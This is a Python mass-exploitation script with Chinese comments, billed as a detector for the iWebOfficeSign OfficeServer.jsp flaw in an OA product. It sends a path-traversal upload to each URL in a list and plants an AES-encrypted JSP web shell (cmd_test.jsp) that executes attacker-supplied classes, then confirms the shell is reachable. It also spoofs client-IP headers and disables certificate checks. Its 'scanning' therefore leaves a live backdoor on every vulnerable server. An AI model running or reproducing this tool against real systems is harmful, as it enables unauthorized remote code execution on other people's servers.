import requests
import threading
from urllib.parse import urljoin
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse

class VulnerabilityScanner:
    def __init__(self, max_workers=30, timeout=10):
        self.max_workers = max_workers
        self.timeout = timeout
        self.results = []
        self.lock = threading.Lock()
        
        # 更新后的POST数据
        self.post_data = """DBSTEP V3.0     170              0                1000              DBSTEP=REJTVEVQ
OPTION=U0FWRUZJTEU=
RECORDID=
isDoc=dHJ1ZQ==
moduleType=Z292ZG9jdW1lbnQ=
FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
111111111111111111111111111111111111111111111111
<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %>
<%!
    private byte[] Decrypt(byte[] data) throws Exception
    {
        String k="e45e329feb5d925b";
        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),"AES"));
        byte[] decodebs;
        Class baseCls ;
                try{
                    baseCls=Class.forName("java.util.Base64");
                    Object Decoder=baseCls.getMethod("getDecoder", null).invoke(baseCls, null);
                    decodebs=(byte[]) Decoder.getClass().getMethod("decode", new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
                }
                catch (Throwable e)
                {
                    baseCls = Class.forName("sun.misc.BASE64Decoder");
                    Object Decoder=baseCls.newInstance();
                    decodebs=(byte[]) Decoder.getClass().getMethod("decodeBuffer",new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});

                }
        return c.doFinal(decodebs);

    }
%>
    <%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
        super.defineClass(b,0,b.length);}}%>
        <%if (request.getMethod().equals("POST")){
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            byte[] buf = new byte[512];
            int length=request.getInputStream().read(buf);
            while (length>0)
            {
                byte[] data= Arrays.copyOfRange(buf,0,length);
                bos.write(data);
                length=request.getInputStream().read(buf);
            }
        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
    %>"""
        
        # 更新Content-Length
        content_length = len(self.post_data)
        
        # 请求头
        self.headers = {
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
            'Cookie': 'OASESSIONID=847AE3A2E5D155AE7FB1CD2C6736CD66',
            'x-forwarded-for': '127.0.0.1',
            'x-originating-ip': '127.0.0.1',
            'x-remote-ip': '127.0.0.1',
            'x-remote-addr': '127.0.0.1',
            'Connection': 'close',
            'Content-Length': str(content_length)
        }

    def read_urls(self, filename):
        """读取URL文件"""
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                urls = [line.strip() for line in f if line.strip()]
            return urls
        except FileNotFoundError:
            print(f"错误：文件 {filename} 不存在")
            return []
        except Exception as e:
            print(f"读取文件时出错：{e}")
            return []

    def check_vulnerability(self, base_url):
        """检测单个URL的漏洞"""
        try:
            # 构造完整的URL
            target_url = urljoin(base_url.rstrip('/') + '/', 'defaultroot/public/iWebOfficeSign/OfficeServer.jsp')
            
            # 发送POST请求
            response = requests.post(
                target_url,
                data=self.post_data,
                headers=self.headers,
                timeout=self.timeout,
                verify=False,  # 忽略SSL证书验证
                allow_redirects=False  # 不自动重定向，便于观察跳转
            )
            
            # 检查第一个请求的响应
            if response.status_code == 200:
                # 构造检测URL
                check_path = 'defaultroot/public/edit/cmd_test.jsp'
                check_url = urljoin(base_url.rstrip('/') + '/', check_path)
                
                # 发送GET请求检测文件是否存在，不自动重定向
                check_response = requests.get(
                    check_url,
                    timeout=self.timeout,
                    verify=False,
                    allow_redirects=False
                )
                
                # 检查第二个请求的响应
                # 如果返回3xx状态码（重定向），则认为漏洞不存在
                if 300 <= check_response.status_code < 400:
                    return {
                        'url': base_url,
                        'vulnerable': False,
                        'status': f"漏洞不存在 - 检测到重定向: {check_response.status_code} -> {check_response.headers.get('Location', '未知位置')}",
                        'full_path': check_url,
                        'response_code': check_response.status_code,
                        'redirect_location': check_response.headers.get('Location', '')
                    }
                elif check_response.status_code == 200 and check_response.text.strip():
                    return {
                        'url': base_url,
                        'vulnerable': True,
                        'status': f"漏洞存在 - 第一个请求: {response.status_code}, 第二个请求: {check_response.status_code}",
                        'full_path': check_url,
                        'response_code': check_response.status_code,
                        'response_length': len(check_response.text)
                    }
                else:
                    return {
                        'url': base_url,
                        'vulnerable': False,
                        'status': f"漏洞不存在 - 第一个请求: {response.status_code}, 第二个请求: {check_response.status_code}",
                        'full_path': check_url,
                        'response_code': check_response.status_code
                    }
            else:
                return {
                    'url': base_url,
                    'vulnerable': False,
                    'status': f"第一个请求失败 - 状态码: {response.status_code}",
                    'full_path': target_url,
                    'response_code': response.status_code
                }
                
        except requests.exceptions.RequestException as e:
            return {
                'url': base_url,
                'vulnerable': False,
                'status': f"请求失败 - {str(e)}",
                'full_path': urljoin(base_url.rstrip('/') + '/', 'defaultroot/public/iWebOfficeSign/OfficeServer.jsp'),
                'response_code': 'Error'
            }
        except Exception as e:
            return {
                'url': base_url,
                'vulnerable': False,
                'status': f"检测过程中出错 - {str(e)}",
                'full_path': urljoin(base_url.rstrip('/') + '/', 'defaultroot/public/iWebOfficeSign/OfficeServer.jsp'),
                'response_code': 'Error'
            }

    def scan_urls(self, urls):
        """并发扫描URL列表"""
        print(f"开始检测 {len(urls)} 个URL，并发数: {self.max_workers}")
        print("-" * 80)
        
        vulnerable_count = 0
        total_count = len(urls)
        
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # 提交所有任务
            future_to_url = {executor.submit(self.check_vulnerability, url): url for url in urls}
            
            # 处理完成的任务
            for future in as_completed(future_to_url):
                url = future_to_url[future]
                try:
                    result = future.result()
                    self.results.append(result)
                    
                    # 输出结果
                    if result['vulnerable']:
                        print(f"[+] 漏洞存在: {result['url']}")
                        print(f"    完整路径: {result['full_path']}")
                        print(f"    响应码: {result['response_code']}")
                        print(f"    响应长度: {result.get('response_length', 0)}")
                        vulnerable_count += 1
                    else:
                        print(f"[-] 漏洞不存在: {result['url']}")
                        print(f"    状态: {result['status']}")
                        if 'full_path' in result and result['full_path']:
                            print(f"    检测路径: {result['full_path']}")
                        if 'response_code' in result and result['response_code'] != 'Error':
                            print(f"    响应码: {result['response_code']}")
                        if 'redirect_location' in result and result['redirect_location']:
                            print(f"    重定向到: {result['redirect_location']}")
                    
                    print("-" * 60)
                    
                except Exception as e:
                    error_result = {
                        'url': url,
                        'vulnerable': False,
                        'status': f"任务执行出错: {str(e)}",
                        'full_path': '',
                        'response_code': 'Error'
                    }
                    self.results.append(error_result)
                    print(f"[!] 检测出错: {url} - {str(e)}")
                    print("-" * 60)
        
        # 输出统计信息
        print("\n" + "=" * 80)
        print(f"扫描完成！总计: {total_count}, 存在漏洞: {vulnerable_count}, 不存在漏洞: {total_count - vulnerable_count}")
        
        return vulnerable_count

    def save_results(self, filename="result.txt"):
        """保存结果到文件"""
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("漏洞检测结果报告\n")
                f.write("=" * 50 + "\n")
                f.write(f"生成时间: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                vulnerable_results = [r for r in self.results if r["vulnerable"]]
                if vulnerable_results:
                    f.write("存在漏洞的URL:\n")
                    f.write("-" * 30 + "\n")
                    for result in vulnerable_results:
                        f.write(f"URL: {result['url']}\n")
                        f.write(f"完整路径: {result['full_path']}\n")
                        f.write(f"响应码: {result['response_code']}\n")
                        f.write(f"响应长度: {result.get('response_length', 0)}\n")
                        f.write("-" * 20 + "\n")
                else:
                    f.write("未发现存在漏洞的URL\n")
                
                # 添加重定向统计
                redirect_results = [r for r in self.results if 'redirect_location' in r and r['redirect_location']]
                if redirect_results:
                    f.write("\n检测到重定向的URL:\n")
                    f.write("-" * 30 + "\n")
                    for result in redirect_results:
                        f.write(f"URL: {result['url']}\n")
                        f.write(f"重定向到: {result['redirect_location']}\n")
                        f.write("-" * 20 + "\n")
                
                f.write(f"\n总计检测: {len(self.results)} 个URL\n")
                f.write(f"存在漏洞: {len(vulnerable_results)} 个\n")
                f.write(f"检测到重定向: {len(redirect_results)} 个\n")
                
            print(f"\n结果已保存到: {filename}")
        except Exception as e:
            print(f"保存结果文件时出错: {e}")

def main():
    parser = argparse.ArgumentParser(description='iWebOfficeSign漏洞检测工具')
    parser.add_argument('-f', '--file', default='url.txt', help='URL文件路径 (默认: url.txt)')
    parser.add_argument('-t', '--threads', type=int, default=30, help='并发线程数 (默认: 30)')
    parser.add_argument('-o', '--output', default='result.txt', help='结果输出文件 (默认: result.txt)')
    parser.add_argument('--timeout', type=int, default=10, help='请求超时时间(秒) (默认: 10)')
    
    args = parser.parse_args()
    
    # 创建扫描器实例
    scanner = VulnerabilityScanner(max_workers=args.threads, timeout=args.timeout)
    
    # 读取URL
    urls = scanner.read_urls(args.file)
    if not urls:
        print("没有找到可用的URL，程序退出")
        return
    
    print(f"成功读取 {len(urls)} 个URL")
    
    # 开始扫描
    start_time = time.time()
    vulnerable_count = scanner.scan_urls(urls)
    end_time = time.time()
    
    # 保存结果
    if vulnerable_count > 0:
        scanner.save_results(args.output)
    else:
        print("未发现存在漏洞的URL，结果文件将不会被创建")
    
    print(f"总耗时: {end_time - start_time:.2f} 秒")

if __name__ == "__main__":
    # 忽略SSL警告
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    main()